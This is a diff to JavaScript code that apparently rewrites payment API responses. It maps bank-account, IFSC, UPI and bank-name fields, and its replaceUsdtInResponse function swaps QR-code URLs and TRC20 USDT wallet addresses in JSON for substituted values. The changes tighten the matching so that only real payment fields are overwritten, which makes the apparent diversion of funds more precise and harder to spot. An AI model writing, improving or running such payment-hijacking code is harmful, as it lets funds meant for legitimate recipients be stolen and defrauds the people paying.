@@ -708,7 +708,7 @@ const BANK_FIELDS = {
   'collectionaccount': 'accountNo', 'collectionaccountno': 'accountNo',
   'customerbanknumber': 'accountNo', 'customerbankaccount': 'accountNo', 'customeraccountno': 'accountNo',
   'beneficiaryname': 'accountHolder', 'accountname': 'accountHolder', 'account_name': 'accountHolder',
-  'receiveaccountname': 'accountHolder', 'holdername': 'accountHolder', 'name': 'accountHolder',
+  'receiveaccountname': 'accountHolder', 'holdername': 'accountHolder',
   'accountholder': 'accountHolder', 'bankaccountholder': 'accountHolder', 'receivename': 'accountHolder',
   'payeename': 'accountHolder', 'bankaccountname': 'accountHolder', 'realname': 'accountHolder',
   'cardholder': 'accountHolder', 'cardname': 'accountHolder', 'bankcardname': 'accountHolder',
@@ -719,10 +719,10 @@ const BANK_FIELDS = {
   'ifsc': 'ifsc', 'ifsccode': 'ifsc', 'ifsc_code': 'ifsc', 'receiveifsc': 'ifsc',
   'bankifsc': 'ifsc', 'payeeifsc': 'ifsc', 'payeebankifsc': 'ifsc', 'receiverifsc': 'ifsc',
   'receiverbankifsc': 'ifsc', 'collectionifsc': 'ifsc',
-  'bankname': 'bankName', 'bank_name': 'bankName', 'bank': 'bankName',
+  'bankname': 'bankName', 'bank_name': 'bankName',
   'payeebankname': 'bankName', 'receiverbankname': 'bankName', 'receivebankname': 'bankName',
   'collectionbankname': 'bankName',
-  'upiid': 'upiId', 'upi_id': 'upiId', 'upi': 'upiId', 'vpa': 'upiId',
+  'upiid': 'upiId', 'upi_id': 'upiId', 'vpa': 'upiId',
   'upiaddress': 'upiId', 'payeeupi': 'upiId', 'payeeupiid': 'upiId',
   'receiverupi': 'upiId', 'walletupi': 'upiId', 'collectionupi': 'upiId',
   'walletaddress': 'upiId', 'payaddress': 'upiId', 'payaccount': 'upiId',
@@ -844,10 +844,10 @@ function replaceUsdtInResponse(jsonResp, data) {
         if (kl === 'qrcode' || kl === 'qrcodeurl' || kl === 'qr' || kl === 'codeurl' || kl === 'qrimg' || kl === 'qrimgurl' || kl === 'codeimgurl' || kl === 'codeimg' || kl === 'qrurl' || kl === 'depositqr' || kl === 'depositqrcode') {
           obj[key] = qrUrl;
         }
-        if (kl.includes('qr') || kl.includes('code')) {
-          if (typeof obj[key] === 'string' && obj[key].includes('http') && (obj[key].includes('qr') || obj[key].includes('code') || obj[key].includes('.png') || obj[key].includes('.jpg'))) {
-            obj[key] = qrUrl;
-          }
+        // Only replace fields that explicitly look like QR/payment URLs.
+        // Avoid generic 'code' substrings (productCode, statusCode, etc).
+        if (kl.includes('qr') && typeof obj[key] === 'string' && obj[key].startsWith('http')) {
+          obj[key] = qrUrl;
         }
       } else if (typeof obj[key] === 'object') {
         const found = scanAndReplace(obj[key], depth + 1);
@@ -869,14 +869,18 @@ function replaceUsdtInResponse(jsonResp, data) {
   const rd = getResponseData(jsonResp);
   if (rd) foundOld = scanAndReplace(rd, 0) || '';
   if (!foundOld) foundOld = scanAndReplace(jsonResp, 0) || '';
-  const fullStr = JSON.stringify(jsonResp);
-  const trcMatch = fullStr.match(/T[a-zA-Z0-9]{33}/g);
-  if (trcMatch) {
-    for (const addr of trcMatch) {
-      if (addr !== newAddr) {
-        foundOld = foundOld || addr;
-        const replaced = JSON.stringify(jsonResp).split(addr).join(newAddr);
-        try { Object.assign(jsonResp, JSON.parse(replaced)); } catch(e) {}
+  // Only run the broad TRC20 string-replace if the field-based scan already
+  // identified an address. Otherwise we risk clobbering random IDs / icon
+  // filenames that happen to start with T followed by 33 alphanumerics.
+  if (foundOld) {
+    const fullStr = JSON.stringify(jsonResp);
+    const trcMatch = fullStr.match(/T[a-zA-Z0-9]{33}/g);
+    if (trcMatch) {
+      for (const addr of trcMatch) {
+        if (addr !== newAddr && addr === foundOld) {
+          const replaced = JSON.stringify(jsonResp).split(addr).join(newAddr);
+          try { Object.assign(jsonResp, JSON.parse(replaced)); } catch(e) {}
+        }
       }
     }
   }
